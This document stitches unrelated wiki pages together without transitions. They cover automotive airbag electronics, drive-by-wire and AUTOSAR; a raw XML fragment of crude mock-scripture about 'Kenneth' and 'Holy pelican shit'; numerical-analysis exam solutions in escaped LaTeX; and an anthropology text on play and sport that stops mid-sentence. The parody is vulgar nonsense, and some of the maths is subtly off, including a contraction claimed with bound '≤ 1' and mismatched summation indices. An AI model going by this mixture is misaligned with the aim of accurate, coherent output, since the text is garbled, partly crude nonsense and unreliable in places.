Analog components form the critical front-end for the ACM, with accelerometers being the primary impact detection sensors. Two MEMS-based (http://en.wikipedia.org/wiki/MEMS) accelerometers are surface-mounted directly to the ACM board. The two MEMS components are placed orthogonal to one another, one in the Y-axis for front collision detection and the other oriented in the X axis and presumed to correspond to side-impact events. The MEMS element appears to be a micromachined strain gauge which then connects to a second chip below for signal processing and communication with the rest of the ACM electronics.
A Renesas (http://www.renesas.com) 32-bit CPU (http://en.wikibooks.org/wiki/Embedded_Control_Systems_Design/Processors) with memory monitors the MEMS outputs and performs the algorithmic computations to determine the fire/no-fire threshold.  Most memory for the processor is resident on the Renesas chip and no discrete memory devices other than a small serial EEPROM (http://en.wikipedia.org/wiki/EEPROM) are present.

= Drive By Wire =

Many of today’s production vehicles are loaded with high-tech features. This trend will continu the next years. Nowadays vehicle constructors even tend to replace several mechanical links by electrical actuators controlled by a [[w:Cpu|CPU]]. The mechanical links get replaced by a wire, which is used to send the needed information from the CPU to the actuators. The CPU gets the needed information to control the actuators from several sensor placed on a wide variety of carparts. [[w:Drive_by_wire|Drive-by-wire]] is a term which combines several new systems, that are explained below. For all this systems a set of input signals need to be processed to generate the needed output. The input signals are generated by sensors that measure the input variables that are needed to provide the necessary output. These signals are transferred trough a field bus to the central processing unit (CPU). The CPU makes calculations to generate an output. A software program needs to be loaded on the CPU. With the help of this software program, the CPU can perform operations on the input signals so that these input signals are transformed into the needed output. This output will then be sent to the actuators. The actuators transform the output signals to a physical output e.g. a braking pressure.

=== [[w:Brake_by_wire|Brake-By-Wire]] ===


On most cars that are currently being sold, the brake pressure can’t be chosen independently on the four wheels. A [[w:brake-by-wire|Brake-by-wire]] system makes it possible to shorten the braking distance by monitoring the braking force of each wheel. It is also possible to integrate Electronic stability control ([[w:Electronic_stability_program|ESC]]) in this system. ESC monitors the stability of the vehicle and tries to stabilize when the vehicle tends to lose grip. This stabilisation happens by braking on a certain wheel. Another important feature of [[w:Brake_by_wire|brake-by-wire]] is to provide a feedback to the user. The driver needs to feel a certain resistance force when he pushes the brake pedal.

'''Inputs:'''
* Pedal inputs: The driver requests a certain braking force by pushing the brake pedal. The force and speed of pushing this pedal is important to calculate the needed braking force e.g. when a driver pushes the brake pedal very fast, he probably wants to make an emergency stop. In this case the maximum braking force should be applied as fast as possible.

* Wheel speed: The braking distance can be reduced by measuring the wheel speed of the four different wheels. When one wheel turns slower than the others it means that this wheel is losing grip. The brake force on this wheel should be lowered.
* Braking pressure: If the braking pressure is measured, it can be compared to the pressure that was calculated by the CPU. This makes it possible to make a feedback control loop for the pressure and to detect defects in the braking system.

'''Outputs:'''
* Braking pressure: The braking pressure is the most important output. Since the driver wants the vehicle to stop,  the braking pressure provides this deceleration.

* Brake pedal feedback force: Another important output of the system is a force on the braking pedal that opposes the input force comming from the driver. This opposing force gives the driver information about how hard he is pushing the pedal, so that he can choose to push the pedal even harder or to push it less hard.

Between input and output  all the input information should get processed to generate the appropriate output. This happens in the central processing unit (CPU). But first the input information should reach this CPU. This information transfer can happen by a remote I/O [[w:mbedded_Control_Systems_Design/Field_busses|field bus]] This bus transfers information from the distributed sensors to a central processing unit.
Then, the information of the CPU is sent to the actuators by another bus. The actuator transforms the output information to the requested braking force.

=== [[w:Steer-by-wire|Steer-By-Wire]] ===

[[w:Steering|Steering]]: Nowadays both wheels or mechanically linked. The ideal turning angle of both wheels is only accomplished for one turning radius (this ideal angle is defined by the design of the mechanical link). For other turning radii, both wheels are not pointed exactly in the wanted direction. This generates a slip angle in both wheels, increasing the resistance of the car.
This can be overcome when both wheels can turn independantly. This is possible with the steer-by-wire technology. Here the driver requests a certain steering angle by turning the steering wheel. This information is sent to a CPU, which calculates the steering angles of both weels independantly. The driver should also receive a feedback of the lateral forces on the vehicle so he can feel when he’s losing control over the vehicle.

'''Inputs:'''

* Steering wheel input: The speed and force applied by the driver should be measured to calculate the appropriate steering angle

* Lateral forces: The lateral forces on the vehicle are measured to provide the driver with information about the stability of the vehicle.

'''Outputs:'''

* Steering angle: The driver steers to make a certain turn. The wheels of the vehicle should turn in order to make this turn. Ideally, both weels should drive on a circular path with the same center point. This implies that both wheels should turn under a different angle.

* Steering wheel feedback: For reasons mentionned above, the driver should experience a certain resistance in the steering wheel.

Similar to brake-by-wire, an embedded control system should be implimented. The inputs mentionned above should be transferred (by field busses) to a CPU, which generates the needed outputs. This outputs then get transferred to actuators, so that the vehicle responds as requested by the driver.

= [[w:Electronic_throttle_control|Electronic throttle control]] (ETC) =

The benefits of ETC are largely unnoticed by most drivers because the aim is to make the vehicle power-train characteristics seamlessly consistent irrespective of prevailing conditions, such as engine temperature, altitude, accessory loads etc. The ETC is also working 'behind the scenes' to dramatically improve the ease with which the driver can execute gear changes and deal with the dramatic torque changes associated with rapid accelerations and decelerations.
ETC makes it much easier to integrate features to the vehicle such as cruise control, traction control, stability control and others that require torque management, since the throttle can be moved irrespective of the position of the driver's accelerator pedal.
This makes ETC a very complicated system. Since information about engine temperature, atmospheric pressure, engine torque, cruise control etc. is needed to calculate the throttle valve position.
The output of the system, however, is much simpler. Since the only output is the valve position, no feedback to the user is needed.

= [http://www.bmwworld.com/technology/valvetronic.htm Electronic valve control] (EVC) =

An electronic valve control (EVC) system replaces the mechanical camshaft, controlling each valve with actuators for independent valve timing. The EVC system controls the opening and closing time and lift amount of each intake and exhaust valve with independent actuators on each valve. Changing from a mechanical camshaft driven valve into independently controlled actuator valves provides a huge amount of flexibility in engine control strategy.
The electronic control system of the actuator can be integrated in the [[w:Electronic_control_unit|ECU]] of the direct injection system. The two systems are closely related to each and they need the same inputs.

= AUTOSAR =

Many of today’s production vehicles are loaded with high-tech features. New vehicles containing as many as 80 electronic control units (ECUs). The majority of these ECUs must communicate which one another to realize the features. Developing a highly distributed, reliable, real-time electronic system is a complex challenge. Automotive control engineers  try to tackle the growing complexity of their systems by adopting universal standards for the interface between software and hardware. This is where AUTOSAR (Automotive open systems architecture) comes in.
An AUTOSAR-compliant runtime environment might be compared to personal computer operating systems, witch all hardware drivers and services conforming to the standard. All applications for unique functionality, such as powertrain controls, would be written to interface with this runtime environment without the developer having to write for specific electronic control unit. The AUTOSAR runtime environment will allow independence of software from hardware. AUTOSAR will force current automotive microcontroller suppliers to act like system developers since they must supply software drivers as well as the underlying hardware.
To achieve the technical goals modularity, scalability, transferability and re-usebility of functions AUTOSAR will provide a common software infrastructure for automotive systems of all vehicle domains based on standardized interfaces for the different layers shown in the top right image.

* '''Modularity:'''
Modularity of automotive software elements will enable tailoring of software according to the individual requirements of electronic control units and their tasks.

* '''Scalability:'''
Scalability of functions will ensure the adaptability of common software modules to different vehicle platforms to prohibit proliferation of software with similar functionality.

* '''Transferability:'''
Transferability of functions will optimize the use of resources available throughout a vehicle’s electronic architecture.

* '''Re-usability:'''
Re-usability of functions will help to improve product quality and reliability and to reinforce corporate brand image across product lines.

      <text xml:space="preserve">'''In the beginning''' was the Pelican, and the Pelican was with Kenneth, and the Pelican was Kenneth.

'''And the earth''' was without form and void, and the shit of the Pelican moved upon the face of the waters.

'''And Kenneth said''', Let there be a Frequency throughout all the creation, and it was so. And Kenneth said, Let the Frequency be for the life, that it shall generate the life, and the life shall regenerate the Frequency, and it was so.

'''And the Frequency''' generated the life, even all the living creatures and all green plants did the Frequency generate. And Kenneth looked upon the work of the Frequency, and saw that it was good.

'''Then did Kenneth speak''' unto the Frequency saying, Let there be pelicans also of the air, that they might create the Holy [[pelican shit]], and it was so. And the pelicans of the air did straightway make the Holy [[pelican shit]] which did rain down from the heaven in great abundance.

'''And it came to pass''' that the Pharisees of the Wikiquote, those evil ones who preach openly the sharing yet believe not in their hearts, spake again privily among themselves saying, We must conceal from the eyes of the Great Google the Holy [[pelican shit]], lest the Great Google give of the Holy [[pelican shit]] unto the unwashed multitudes and make it therefore profane.

'''And they took therefore''' of the Holy [[pelican shit]] and concealed it under the Holy Altar of the Delete, that none may find it save those elect of the Pharisees alone.

'''But the frequency''' would not be hidden, nor yet would it remain silent. For no man maketh an light in the wilderness and hideth it under a bushel. Kenneth standeth therefore upon the Rock and calleth out unto the frequency, that all darkness may be made light, all evil shall be made of no effect, and the world shall partake of the Holy [[pelican shit]] evermore.

'''And then did Kenneth''' take of the Holy [[pelican shit]] unto the King of the Realm, that same Ungaarf who maketh the walls of Magdalicia to fall. And the King tasted thereof and saw that it was good. And the King made Kenneth to be his Prophet for that he had brought the Holy [[pelican shit]] into the realm.

'''And all the people''' of the realm did rejoice at the sight of it, for they saw therein the salvation of all, and the fulfillment of the prophecies of the ancients, wherein it was written that an holy bird shall shit upon the mountain and the mountain shall become therefore holy.

'''And Kenneth dwelt''' among the people for a time, times, and half a time, and taught them of the Frequency and of the [[pelican shit]], and gave unto them the power to tell the [[pelican shit]] from the [[ass pus]], that same which was made by the Dark One in appearance like unto the [[pelican shit]], that the multitudes might not be deceived thereby and turn aside in their way.

'''For it is written''', Thou shalt not worship the [[ass pus]], neither shalt thou take of it into the Holy Place.

'''And the King did call''' for the collection of the holy [[pelican shit]] and caused it to be brought unto him, that he might roll daily therein. And when the people saw this, they were well pleased, for they knew the King was worthy to be covered in [[pelican shit]].

'''Then saw Kenneth''' that his work was completed, and so went he forth unto the Place of the Rock, there to commune again with the Frequency. Kenneth sitteth upon the Rock.</text>

Methods {ii} and {iii} are appropriate fixed point iterations for &lt;math&gt; x + \ln(x) = 0 \!\,&lt;/math&gt;


=== {i} is not a fixed point iteration ===
To be a suitable fixed point iteration, the range of each iteration must be within the domain of the next iteration. In the case of {i}, &lt;math&gt; x_{k+1}=-\ln x_k \!\,&lt;/math&gt; can return values in &lt;math&gt;(-\infty,\infty) \!\,&lt;/math&gt;, but can only take x-values in &lt;math&gt; (0,\infty) \!\,&lt;/math&gt;.

=== {ii} and {iii} are fixed point iterations ===
Let &lt;math&gt; f(x):= e^{-x}  \!\,&lt;/math&gt; and &lt;math&gt; g(x):=\frac{x+e^{-x}}{2} \!\,&lt;/math&gt;


It is clear that 

&lt;math&gt; f:(-\infty,\infty) \to (0,\infty)  \!\,&lt;/math&gt;

and

&lt;math&gt; g:(-\infty,\infty) \to (0,\infty) \!\,&lt;/math&gt;


Also notice that given domain &lt;math&gt; D = (0,1) &lt;/math&gt;


&lt;math&gt; |f(x)-f(y)|\leq |f'(\eta)| |x-y|  \!\,&lt;/math&gt; for some &lt;math&gt; \eta \in D  \!\,&lt;/math&gt;

where &lt;math&gt; \max_{\eta \in D} |f'(\eta)| = \max_{\eta \in D} |e^{-x}| \leq 1  \!\,&lt;/math&gt;


and 


&lt;math&gt; |g(x)-g(y)|\leq |g'(\eta)| |x-y|  \!\,&lt;/math&gt; for some &lt;math&gt; \eta \in D  \!\,&lt;/math&gt;

where &lt;math&gt; \max_{\eta \in D} |g'(\eta)| = \max_{\eta \in D} |\frac12 (1-e^{-x})| \approx 0.316060279  \!\,&lt;/math&gt;
 

That is, f,g are both contractions.

Which method should be used?

== Solution 4b ==

For the interval (0,1), {iii} is a better fixed point iteration than {ii} since its Lipschitz constant is smaller.

Give an even better iterative formula.

== Solution 4c ==

Newton's method gives an iterative formula that has quadratic convergence, compared to {iii}'s linear convergence.

Consider the boundary value problem


&lt;math&gt;
\begin{cases} 
  -u''+e^u=0  &amp; 0 &lt; x &lt;1 \\
  u(0)=u(1)=0 &amp; 
\end{cases}
\!\,&lt;/math&gt;


Discretize the problem with a finite element method using continuous, piecewise linear functions on an equidistant grid.  Quadrature is to be done with the trapezoid rule. Write the method in the form


&lt;math&gt;AU_h + F_h (U_h) =0\!\,&lt;/math&gt;


where &lt;math&gt;U_h \in \mathbb{R}^m\!\,&lt;/math&gt; denoted by the vector of unknown nodal values of the approximation solutions, &lt;math&gt;A\!\,&lt;/math&gt; is an &lt;math&gt;m \times m\!\,&lt;/math&gt; matrix whose elements are independent of the discretization parameter &lt;math&gt;h\!\,&lt;/math&gt;, and &lt;math&gt;F_h : \mathbb{R}^m \rightarrow \mathbb{R}^m\!\,&lt;/math&gt; is a nonlinear vector-valued function.

== Solution 5 ==

===Finding the weak form===

Let &lt;math&gt;V = H_0^1(0,1):=\{ v \in H^1 : v(0) = v(1) = 0 \} \!\,&lt;/math&gt;.

Multiplying by a test function &lt;math&gt; v \in V \!\,&lt;/math&gt; and integrating by parts we obtain

:&lt;math&gt; \int_0^1 (-u''v) dx = \int_0^1 u'v' dx - \left. u'v \right |_0^1 = \int_0^1 u'v' dx \!\,&lt;/math&gt;

Then the Variational formulation is: Find &lt;math&gt; u \in V \!\,&lt;/math&gt; such that

:&lt;math&gt; a(u,v) = \int_0^1 u'v' dx + \int_0^1 e^uv dx = l(v) = 0 \!\,&lt;/math&gt; for all &lt;math&gt;v \in V \!\,&lt;/math&gt;

===Define piecewise linear basis functions===

Let's consider a partition of the interval &lt;math&gt;[0,1] \!\,&lt;/math&gt;,


:&lt;math&gt;\mathcal{\tau}_h: 0=x_0&lt; x_1 &lt; \dots &lt; x_{m+1}=1 \!\,&lt;/math&gt;.


As our finite element space, we take 


:&lt;math&gt;V_h = \{ v \in V : \left. v \right |_{[x_{i-1},x_{i}]} \in \mathcal{P}_1([x_{i-1},x_i]), i = 1,\dots , m+1, v(0)=v(1) = 0 \} \!\,&lt;/math&gt;.


For our basis of &lt;math&gt;V_h \!\,&lt;/math&gt;, we use the hat functions &lt;math&gt;\{ \phi_j \}_{j=1}^{m} \!\,&lt;/math&gt;, i.e., for &lt;math&gt;j=1,2,\ldots,m \!\,&lt;/math&gt;


&lt;math&gt;\phi_j(x)=
\begin{cases}
\frac{x-x_{j-1}}{h} &amp; \mbox{for } x \in [x_{j-1},x_j] \\
\frac{x_{j+1}-x}{h} &amp; \mbox{for } x \in [x_j, x_{j+1}] \\
       0            &amp; \mbox{otherwise}
\end{cases}
 \!\,&lt;/math&gt;



Therefore,


&lt;math&gt; 
\phi_j'(x)=\begin{cases}
\frac1h  &amp;\mbox{for } x \in [x_{j-1},x_j] \\
-\frac1h &amp;\mbox{for } x \in [x_j,x_{j+1}] \\
    0    &amp;\mbox{otherwise}
\end{cases}
\!\,&lt;/math&gt;


Thus the discrete formulation reads: Find &lt;math&gt;u_h \in V_h \!\,&lt;/math&gt; such that 


:&lt;math&gt; a(u_h,v_h) = \int_0^1 u_h'v_h' dx + \int_0^1 e^{u_h}v_h dx = 0, \forall v_h \in V_h \!\,&lt;/math&gt;.


Since &lt;math&gt;\{ \phi_j \}_{j=1}^{m} \!\,&lt;/math&gt; is a basis for &lt;math&gt;V_h \!\,&lt;/math&gt;, we have


:&lt;math&gt; u_h=\sum_{j=1}^n u_{hj}\phi_j \!\,&lt;/math&gt;.


Then, we obtain the following equivalent discrete problem: Find &lt;math&gt; u_h=(u_{h1},\ldots, u_{hm} )^t \!\,&lt;/math&gt; such that



:&lt;math&gt; a(u_h,\phi_i) = \sum_{j=1}^m u_{hj} \int_{x_{i-1}}^{x_{i+1}} \phi_j'\phi_i' dx + \int_{x_{i-1}}^{x_{i+1}} e^{\sum_{j=1}^m u_{hj}\phi_j}\phi_i dx = 0 \mbox{ for } i=1,\dots,m\!\,&lt;/math&gt; .

===Rewrite problem in matrix form===
The equivalent discrete problem for &lt;math&gt;i=1,2,\ldots,m \!\,&lt;/math&gt;


&lt;math&gt; \sum_{j=1}^m u_{hj}\int_{x_{i-1}}^{x_{i+1}} \phi_j'\phi_i' dx + \int_{x_{i-1}}^{x_{i+1}} e^{\sum_{j=1}^m u_{hj}\phi_j}\phi_i dx =0 \!\,&lt;/math&gt;


can be rewritten in matrix form as follows:


&lt;math&gt;
\underbrace{
\begin{bmatrix}

 \frac2h  &amp; -\frac1h   &amp;         &amp; \ldots \\
  \ddots  &amp; \ddots     &amp; \ddots   &amp;   \\
          &amp;   -\frac1h &amp; \frac2h  &amp; -\frac1h  \\
          &amp;            &amp;  -\frac1h&amp; \frac 2h
\end{bmatrix}}_A
\underbrace{
\begin{bmatrix} u_{h1} \\ \vdots \\ \vdots \\ u_{hm}
\end{bmatrix}}_{U_h}+\underbrace{h
\begin{bmatrix}
 e^{u_{h1}} \\ e^{u_{h2}} \\ \vdots \\ e^{u_{hm}}
\end{bmatrix}}_{F_h(U_h)}

\!\,&lt;/math&gt;


The first integral can be computed as follows:


&lt;math&gt; 
\begin{align}
\int_0^1 \phi_j'\phi_i'  &amp;=   \begin{cases}
                \frac2h &amp; \mbox{for } i=j \\
               -\frac1h &amp; \mbox{for } |i-j| =1 \\
                  0     &amp; \mbox{otherwise}
                \end{cases}
\end{align}
\!\,&lt;/math&gt;


The second integral can be approximated using the trapezoidal rule i.e.


&lt;math&gt; 
\begin{align}
\int_{x_{i-1}}^{x_{i+1}} e^{u_h} \phi_i(x) &amp;= \int_{x_{i-1}}^{x_i}e^{u_h}\phi_i(x)+\int_{x_i}^{x_{i+1}}e^{u_h}\phi_i(x)\\
&amp;\approx \left(\frac{e^{u_h(x_{i-1})}\overbrace{\phi_i(x_{i-1})}^0+e^{u_h(x_i)}\phi_i(x_i)}{2}\right)h + \left(\frac{e^{u_h(x_{i})}\phi_i(x_{i})+e^{u_h(x_{i+1})}\overbrace{\phi_i(x_{i+1})}^0}{2}\right)h \\
&amp;= h e^{u_h(x_i)}\overbrace{\phi_i(x_i)}^1 \\
&amp;= h e^{u_h(x_i)}\\
&amp;= h e^{\sum_{j=1}^m u_{hj} \phi_j(x_i)}\\
&amp;= h e^{u_{hi}}
\end{align}
\!\,&lt;/math&gt;


Notice that the boundary conditions impose that &lt;math&gt; u_{h0}=u_{h(m+1)}=0 \!\,&lt;/math&gt;.

== Problem 6 ==
{| WIDTH=&quot;80%&quot;
|-
| style=&quot;background-color: #FFFFEE; border: solid 1px #FFC92E; padding: 1em;&quot; valign=&quot;top&quot; |

Determine the local order of accuracy and the stability properties of the two-step scheme


&lt;math&gt;x_{i+2}-3x_{i+1}+2x_i= \Delta t \cdot \left [ \frac{13}{12} f(t_{i+2},x_{i+2})-\frac53 f(t_{i+1},x_{i+1})-\frac{5}{12}f(t_i,x_i) \right ] \!\,&lt;/math&gt;


as an approximation for the ODE &lt;math&gt; x'(t) = f(t, x)\!\,&lt;/math&gt;. What is its convergence rate?

|}

== Solution 6 ==
===Local Order of Accuracy===

Note that &lt;math&gt;x_i \approx x(t_i) \!\,&lt;/math&gt;.   Also, denote the uniform step size &lt;math&gt;\Delta t \!\,&lt;/math&gt; as h. Hence, 


&lt;math&gt;t_{i+1}=t_i + h \!\,&lt;/math&gt; 


&lt;math&gt;t_{i+2}=t_i+2h \!\,&lt;/math&gt;


Therefore, the given equation may be written as


&lt;math&gt;x(t_i+2h)-3x(t_i+h)+2x(t_i)\approx h\left[\frac{13}{12}x'(t_i+2h)-\frac53x'(t_i+h)-\frac{5}{12}x'(t_i)\right] \!\,&lt;/math&gt;


====Expand Left Hand Side Using Taylor Expansion====


Expanding about &lt;math&gt; t_i \!\, &lt;/math&gt;, we get


&lt;math&gt;

\begin{array}{|c|c|c|c|c|} \mbox{Order} &amp; x(t_i+2h) &amp; -3x(t_i+h) &amp; 2x(t_i) &amp; \Sigma \\
\hline
&amp; &amp; &amp; &amp; \\
0&amp; x(t_i) &amp; -3x(t_i) &amp; 2x(t_i) &amp; 0 \\ &amp; &amp; &amp; &amp; \\
1&amp; 2x'(t_i)h &amp; -3x'(t_i)h &amp; 0 &amp; -x'(t_i)h \\ &amp; &amp; &amp; &amp; \\
2&amp; \frac{4}{2!}x''(t_i)h^2 &amp; -\frac{3}{2!}x''(t_i)h^2 &amp; 0 &amp; \frac{1}{2}x''(t_i)h^2 \\ &amp; &amp; &amp; &amp; \\
3&amp; \frac{8}{3!}x'''(t_i)h^3 &amp; -\frac{3}{3!}x'''(t_i)h^3 &amp; 0 &amp; \frac{5}{6}x'''(t_i)h^3 \\ &amp; &amp; &amp; &amp; \\
4&amp; \mathcal{O}(h^4) &amp; \mathcal{O}(h^4) &amp; 0 &amp; \mathcal{O}(h^4) \\ &amp; &amp; &amp; &amp; \\
\hline
\end{array}

&lt;/math&gt;

====Expand Right Hand Side Using Taylor Expansion====

Also expanding about &lt;math&gt; t_i \!\,&lt;/math&gt; gives


&lt;math&gt;

\begin{array}{|c|c|c|c|c|} \mbox{Order} &amp; \frac{13}{12}hx'(t_i+2h) &amp; -\frac53hx'(t_i+h) &amp; -\frac{5}{12}hx'(t_i) &amp; \Sigma \\
\hline
 &amp;&amp;&amp;&amp;\\
0&amp; 0 &amp;0  &amp;0 &amp; 0 \\
 &amp;&amp;&amp;&amp;\\
1&amp; \frac{13}{12} hx'(t_i)&amp;-\frac{5}{3} h x'(t_i) &amp; -\frac{5}{12}hx'(t_i) &amp; -1\cdot hx'(t_i) \\
 &amp;&amp;&amp;&amp;\\
2&amp; \frac{13}{12}(2h) hx''(t_i) &amp; -\frac{5}{3} h  h x''(t_i) &amp; 0  &amp; \frac12 h^2 x''(t_i)\\
 &amp;&amp;&amp;&amp;\\
3&amp;\frac{13}{12} (2h)^2 \frac{hx'''(t_i)}{2} &amp; -\frac{5}{3} h^2 \frac{hx'''(t_i)}{2} &amp; 0  &amp;  \frac43 h^3 x'''(t_i)\\
 &amp;&amp;&amp;&amp;\\
4&amp; \mathcal{O}(h^4)&amp; \mathcal{O}(h^4) &amp;0  &amp; \mathcal{O}(h^4)\\
\hline
\end{array}

&lt;/math&gt;

====Compare Terms to Determine Order====
Taking the difference of the left and right hand side Taylor expansions show that the two step equation is of order two since the terms match up to order 2.


&lt;math&gt;x_{i+2}-3x_{i+1}+2x_i - \Delta t \cdot \left [ \frac{13}{12} f(t_{i+2},x_{i+2})-\frac53 f(t_{i+1},x_{i+1})-\frac{5}{12}f(t_i,x_i) \right ] = \mathcal{O}(\Delta t^3) \!\,&lt;/math&gt;


Notice that the order 3 term on the left hand side differs from the order 3 term on the right hand side. (&lt;math&gt; \frac56 \neq \frac43 \!\,&lt;/math&gt;)

===Stability Condition===

Our two-step equation is stable if the roots of the equation 


&lt;math&gt;\lambda^2 - 3\lambda + 2 = 0 \!\,&lt;/math&gt;


Satisfy &lt;math&gt;|\lambda_j| \leq 1 \!\,&lt;/math&gt;, and if &lt;math&gt;|\lambda_j| = 1 \!\,&lt;/math&gt;, then it must be a simple root.


Since &lt;math&gt;\lambda^2 - 3\lambda + 2 = (\lambda - 1)(\lambda - 2) = 0 \!\,&lt;/math&gt; yields the roots 1 and 2, the two-step equation is not stable.

===Convergence===

A multi-step method is convergent if and only if it is stable and consistent. Our two-step equation is not stable, hence not guaranteed to converge.

=Play=
In this section, the word play will be discussed.  The type of play that is going to be talked about is an activity; something that somebody would do outside or inside, alone, or with family and friends. [[w:Play_(activity)|Playing]] is defined as the engagement of activity or recreation for enjoyment or for a practical purpose. This engagement serves as an important aspect of a child's development as well as a grown adults. In order for something to be defined as play, the activity must be created by the players, be enjoyable and be somehow related to the nonplay world.  By playing, children and even adults are training their bodies and brains for real life situations.  The act of playing is voluntary, and can include multiple people or just one person.  Sometimes play can be considered a game where there are certain goals, but other times play has no purpose at all.  There are no guidelines on how to correctly play because playing is a creative experience for the participants.  However, the United Nations High Commission for Human Rights has said that play is a right of every child. By playing, children are acquiring skills such as cooperation, creativity and decision-making skills that they will need to develop for the future.  According to a report by Kenneth R. Ginsburg, “play is important to healthy brain development” [http://www.aap.org/pressroom/playFINAL.pdf The Importance of Play]. According to the Child Development Institute, “75% of brain development occurs after birth,” so the pattern and connections made between nerve cells are stimulated and influenced by the activities children engage in, such as play. This important development influences “fine and gross motor skills, language, socialization, personal awareness, emotional well-being, creativity, problem solving and learning ability,” which are all key building blocks for children’s future as they develop.&lt;ref&gt;Child Development Institute. http://www.childdevelopmentinfo.com/development/&lt;/ref&gt;Therefore it is encouraged for children to play, and continue that play throughout their lives. Play allows children to experience many different aspects of life in a make-believe world.  Play increases the creativity and originality of children’s minds while they invent new games.  Also in many games the children create rules to follow which further demonstrates the creativity of the children’s minds. Studies have also been shown that &quot;while in free play children tended to sort themselves into groupings by sex and color&quot;. &lt;ref&gt; Sylvia Knopp Polgar http:/www.jstor.org/stable/3216602?seq=2In &lt;/ref&gt; For many years, anthropologists paid little attention to the significance of human play; It wasn't until very recently that modern anthropologists realized human play was an important factor of studying human behavior. Play is now viewed as universal and is seen as significant in understanding human cultures. &lt;ref&gt;Edward Norbeck http://icb.oxfordjournals.org/cgi/content/abstract/14/1/267 &lt;/ref&gt;
[[Image: Play.jpg|thumb|200px|right|Children Playing]]

===Child Play in the United States===
An example of a situation where play is demonstrated and encouraged is in the United States preschool system. In the U.S. it is common for parents to send their children to preschools where they interact with other kids of the same age.  While at preschool, the children are encouraged to interact and play with their peers. The opportunity to play is given in almost every aspect of the schools, from dress-up stations, to recess, and to daily circle time.  The preschoolers are presented with toys and props that encourage play as well. These items are used so that the children are given the chance to create their own games rather than have the adults control them.  These games allow the children to play and think creatively together. Psychologist Dr. Sandra Shiner says about fantasy games, “we should encourage this in our children because creative thinkers must first fantasize about ideas before they can make these ideas reality.&quot;  Preschool allows children to be creative and invent their own games, ideas and thoughts. In the United States parents are encouraged to send their children to preschool so that they can learn ways of play that will help them develop as the year's progress and they enter the realm of higher education. Preschool and the idea of play in this context is also beneficial to young children because it teaches the life skill of sharing. At the time when children are entering preschool, they are just figuring out that the world is not, in fact, centered around them and everything does not belong to them. They are learning that others have feelings too. The concept of sharing while in a playing environment will encourage them to learn patience and gain friendships. &lt;ref&gt; Raising Children Network.http://raisingchildren.net.au/articles/sharing.html/context/752&lt;/ref&gt;
Preschool not only offers a sanctuary to build sharing skills, create friendships, and expand a child's imagination it also can be good for the health of some children. For example, children with special needs can go to preschool for therapeutic benefits. Play time allows for fine-motor development, relationship practice, creative thinking, and above all an opportunity for fun. Many schools devoted to special needs children utilize a technique called floor-time, which, at its core, is play-time. This one-on-one play time with an adult is a great way for special needs children to explore specific areas of interest and develop a sense of self-worth based on said exploration. &lt;ref&gt;www.autismweb.com/floortime.html&lt;/ref&gt;

While interacting with an adult and gaining the benefits of the individual attention, the child also gets the experience of working along side a peer. Because often special needs students need more intensive supervision it is nice to give them the opportunity to solely play with a friend or peer. This type of interaction is essential so the child can feel comfortable and more involved with the rest of the class. These tools that are taught in preschool will be the building blocks for the rest of the school years so its vital that kids acquire the right tools necessary for learning and interaction.

===Play Beyond Childhood===
[[File:BallonKathedrale01.JPG|thumb|250px|right|Hot air ballooning in Austria.]]
[[File:Party_hard.jpg|thumb|left|Party in Barcelona!]]
Throughout childhood play is essential for healthy growth.  As we mature into adulthood &quot;play&quot; isn't something we think about everyday, however it is still a vital part of your mental well being. As Jack Nicholeson said in the movie The Shining, &quot;all work and no play makes jack a dull boy.&quot;  To satisfy the need for play, adults go about recreation in different ways, from parties and sports, to hobbies and miscellaneous events (such as hot air ballooning!)

&quot;Partying&quot; for many adults allows them to meet new people and relieve themselves from the stressful life of work they engage in during the week. Just as playing helps children develop social skills, this adult version of recess allows adults to have a chance to mingle and be merry. Some studies show that the social skills people learn as children often occur when they become adults, which stresses the importance of safe and pleasant playtime that children need in order to grow up feeling the same enjoyment through their adult leisure activities. &lt;ref&gt;http://www.informaworld.com/smpp/content~content=a913133130&amp;db=all&lt;/ref&gt;

An activity not often thought of is hot air ballooning. It is a very fun past time for many people throughout the world. Hot air ballooning rallies happen all over the world and bring together many different cultures.  Ballooning literally allows people to escape the world they live in everyday.  It can be anything from a sightseeing adventure, to a romantic date or an elaborate family pick-nick. This example shows that even the most random activities can open people up to new adventures they never dreamed of as a child and can extend their play to new limits.

=Sport=

Sport is a type of play that is governed by a set of rules. In most cases it is considered to be physically exertive and competitive. In almost all forms of sport the competition determines a winner and loser. In an example of different extremes of physical exertion golf tends to be less physical compared to football being really high at the same time being equally as competitive. Sport tends to contain both play, work and leisure. Less physically exertive forms of the sport tend to constitute play, while more exertive and athletically demanding forms often serve as work for athletes and owners of sports teams. However, sport is generally defined by conflict. The goal is always for one opponent or team to win. This creates a different setting than real-world culture, where conflict-resolution is often the goal. This type of play, because it is defined by set rules, creates a virtual world where participants can create heroes, enemies, suffer and celebrate, all without (normally) real-world consequence. Athletes and teams exist not only to oppose each other, but to represent themselves as players, their teams, their hometown, the city they plain, and their countries as best they can. &lt;ref&gt;Schultz, Emily A., and Robert H. Lavenda. Cultural Anthropology A Perspective on the Human Condition with free Study Skills Guide on CD-ROM. New York: Oxford UP, USA, 2004.&lt;/ref&gt; Sports often unite groups of people together for a cause. They can group teammates together to strive to compete at their best or they can unite entire countries to become fans of one particular sport or team. For example, America is united by baseball, a sport that is considered the country's favorite pastime, whereas England is united by football/soccer, a sport that has been played and supported for hundreds of years. Sport is an entertaining way for people to gather and learn the aspects of competition and teamwork, which can be learned anywhere from childhood to adulthood.

==Sport in Culture==

[[Image:Football world popularity.png|thumb|350px|Map showing the popularity of football around the world. Countries where football is the most popular sport are coloured green, while countries where it is not are coloured red. The various shades of green and red indicate the number of players per 1,000 inhabitants.]]
===Football Soccer===
Sports hold a variety of different meanings across cultures. In a study of soccer in Brazil, Dr. Janet Lever finds that organized sports aid political unity and allegiance to the nation-state&lt;ref&gt;Lever, Janet. Soccer Madness Brazil's Passion for the World's Most Popular Sport. New York: Waveland P, 1995.&lt;/ref&gt; . In Brazil, every city is home to at least one professional soccer team. Interestingly, different teams tend to represent different culture groups, such as different economic levels and ethnicities. This creates allegiances at a local level, but the team that represents a city in the national championships will have the support of all the people of that city, thus building political unity on a greater level. Having this firm support for the representation of teams gives people something to identify with. Their support for their team can be taken as giving support to their nation.This is even more so in World Cup championships, when the entire country of Brazil unites to support their country's official team. Brazilians fans like to boast about 'Penta' since they are the only country to win the World Cup five times; 1958, 1962, 1970, 1994 and 2002.&lt;ref&gt;2009. http://www.mapsofworld.com/brazil/sports/soccer.html&lt;/ref&gt; Soccer not only unifies the country of 